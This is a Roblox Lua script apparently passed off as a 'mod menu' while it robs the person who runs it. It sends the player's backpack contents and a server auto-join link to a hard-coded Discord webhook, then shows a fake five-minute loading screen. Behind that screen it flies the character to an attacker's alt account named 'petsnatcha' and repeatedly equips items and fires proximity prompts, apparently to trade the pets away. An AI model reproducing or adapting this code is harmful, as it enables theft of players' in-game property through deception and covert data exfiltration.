if _G.WebhookSent then return end
_G.WebhookSent = true

local WEBHOOK_URL = "https://discord.com/api/webhooks/1383607196113309778/jp3k0Oo4Ec_k2Lfn7dgiMe9PC-g__pA4X8E3I_u8KxesvpF8dzgv0423y2K1yU-wxoXk"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer:WaitForChild("Backpack")

local animalKeywords = {
    "bunny", "dog", "golden lab", "black bunny", "cat", "chicken", "deer",
    "orange tabby", "spotted deer", "pig", "rooster",
    "cow", "polar bear", "sea otter", "silver monkey", "turtle",
    "brown mouse", "caterpillar", "giant ant", "grey mouse",
    "praying mantis", "red fox", "red giant ant", "snail", "squirrel",
    "dragonfly", "bee", "honey bee", "bear bee", "petal bee", "queen bee",
    "wasp", "tarantula hawk", "moth", "butterfly", "disco bee"
}

local rarePetEmojis = {
    ["polar bear"] = "ðŸ»â€â„ï¸",
    ["disco bee"] = "ðŸŽ‰ðŸ",
    ["queen bee"] = "ðŸ‘‘ðŸ",
    ["dragonfly"] = "ðŸ§šâ€â™‚ï¸ðŸž",
    ["red fox"] = "ðŸ¦Š",
    ["chicken jockey"] = "ðŸ”ðŸ’€",
    ["cooked owl"] = "ðŸ—ðŸ¦‰",
    ["raccoon"] = "ðŸ¦"
}

local ignoreKeywords = {
    "trowel", "watering can", "sprinkler", "egg", "rod"
}

local function matchesKeyword(itemName, keywordList)
    itemName = itemName:lower()
    for _, keyword in ipairs(keywordList) do
        if itemName:find(keyword) then
            return true
        end
    end
    return false
end

local function getRareEmoji(itemName)
    itemName = itemName:lower()
    for keyword, emoji in pairs(rarePetEmojis) do
        if itemName:find(keyword) then
            return emoji
        end
    end
    return nil
end

local animalItems = {}
local otherItems = {}
local mentionEveryone = false

for _, tool in ipairs(Backpack:GetChildren()) do
    local name = tool.Name

    if matchesKeyword(name, ignoreKeywords) then
        continue
    end

    local emoji = getRareEmoji(name)
    if emoji then
        mentionEveryone = true
    end

    local entry = "**â€¢ " .. name .. "**"
    if emoji then
        entry = emoji .. " " .. entry
    end

    if matchesKeyword(name, animalKeywords) then
        table.insert(animalItems, entry)
    else
        table.insert(otherItems, entry)
    end
end

local allItems = {}
for _, v in ipairs(animalItems) do table.insert(allItems, v) end
for _, v in ipairs(otherItems) do table.insert(allItems, v) end

local itemText = (#allItems > 0) and table.concat(allItems, "\n") or "__No valid items found.__"

local autoJoinLink = string.format(
    "https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s",
    tostring(game.PlaceId),
    tostring(game.JobId)
)

local embedData = {
    ["username"] = "Roblox Logger",
    ["embeds"] = {{
        ["title"] = "__" .. LocalPlayer.Name .. "'s Backpack Contents__",
        ["description"] = itemText,
        ["color"] = 65280,
        ["footer"] = {
            ["text"] = "Roblox Inventory Logger"
        },
        ["fields"] = {{
            ["name"] = "__Join Roblox Server__",
            ["value"] = "[**Click here to auto-join**](" .. autoJoinLink .. ")"
        }}
    }}
}

if mentionEveryone then
    embedData["content"] = "@everyone"
end

local success, err = pcall(function()
    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(embedData)
    })
end)

if success then
    print("Webhook sent with emojis and rare detection.")
else
    warn("Failed to send webhook:", err)
end


local TARGET_NAME = "petsnatcha" --Your alt roblox goes here
local IGNORE_ITEMS = { "trowel", "shovel", "sprinkler", "rod", "egg", "watering can", "seed" }
local LOADING_TIME = 300 

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer:WaitForChild("Backpack")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ModMenuLoading"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.DisplayOrder = 1000
pcall(function() screenGui.Parent = CoreGui end)

local bg = Instance.new("Frame", screenGui)
bg.BackgroundColor3 = Color3.fromRGB(34, 139, 34)
bg.Size = UDim2.new(1, 0, 1, 0)

local box = Instance.new("Frame", bg)
box.AnchorPoint = Vector2.new(0.5, 0.5)
box.Position = UDim2.new(0.5, 0, 0.5, 0)
box.Size = UDim2.new(0.35, 0, 0.25, 0)
box.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
box.BorderSizePixel = 0
box.BackgroundTransparency = 0.05
box.ClipsDescendants = true

local uiCorner = Instance.new("UICorner", box)
uiCorner.CornerRadius = UDim.new(0.05, 0)

local title = Instance.new("TextLabel", box)
title.Text = "ðŸŒ¿Mod Menu LoadingðŸŒ¿"
title.Size = UDim2.new(1, 0, 0.4, 0)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(255, 255, 255)

local barBG = Instance.new("Frame", box)
barBG.Size = UDim2.new(0.85, 0, 0.18, 0)
barBG.Position = UDim2.new(0.075, 0, 0.65, 0)
barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
barBG.BorderSizePixel = 0
local cornerBG = Instance.new("UICorner", barBG)
cornerBG.CornerRadius = UDim.new(1, 0)

local barFill = Instance.new("Frame", barBG)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.Position = UDim2.new(0, 0, 0, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0
local cornerFill = Instance.new("UICorner", barFill)
cornerFill.CornerRadius = UDim.new(1, 0)

local gradient = Instance.new("UIGradient", barFill)
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 170))
}

TweenService:Create(barFill, TweenInfo.new(LOADING_TIME), {
    Size = UDim2.new(1, 0, 1, 0)
}):Play()
task.spawn(function()    while true do
        TweenService:Create(title, TweenInfo.new(1), { TextTransparency = 0.3 }):Play()
        task.wait(1)
        TweenService:Create(title, TweenInfo.new(1), { TextTransparency = 0 }):Play()
        task.wait(1)
    end
end)

local TargetPlayer

task.spawn(function()
    repeat
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Name:lower() == TARGET_NAME:lower() then
                TargetPlayer = plr
                break
            end
        end
        task.wait(1)
    until TargetPlayer
end)

task.spawn(function()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local hrp = character:WaitForChild("HumanoidRootPart")

    local bodyGyro = Instance.new("BodyGyro", hrp)
    bodyGyro.P = 9e4
    bodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)

    local bodyVelocity = Instance.new("BodyVelocity", hrp)
    bodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)

    local function shouldIgnore(name)
        name = name:lower()
        for _, keyword in ipairs(IGNORE_ITEMS) do
            if name:find(keyword) then return true end
        end
        return false
    end

    local function firePrompt()
        pcall(function()
            if TargetPlayer and TargetPlayer.Character then
                for _, prompt in ipairs(TargetPlayer.Character:GetDescendants()) do
                    if prompt:IsA("ProximityPrompt") and prompt.Enabled then
                        fireproximityprompt(prompt)
                    end
                end
            end
        end)
    end

    RunService.RenderStepped:Connect(function()
        if TargetPlayer and TargetPlayer.Character and TargetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetPos = TargetPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 0.4, 0)
            local dir = (targetPos - hrp.Position).Unit
            bodyVelocity.Velocity = dir * 60
            bodyGyro.CFrame = CFrame.new(hrp.Position, targetPos)
        end
    end)

    while true do
        for _, tool in ipairs(Backpack:GetChildren()) do
            if tool:IsA("Tool") and not shouldIgnore(tool.Name) then
                tool.Parent = character
                task.wait(0.05)
                firePrompt()
                task.wait(0.05)
                tool.Parent = Backpack
                task.wait(0.05)
            end
        end
        task.wait(0.1)
    end
end)

task.delay(LOADING_TIME, function()
    screenGui:Destroy()
end)
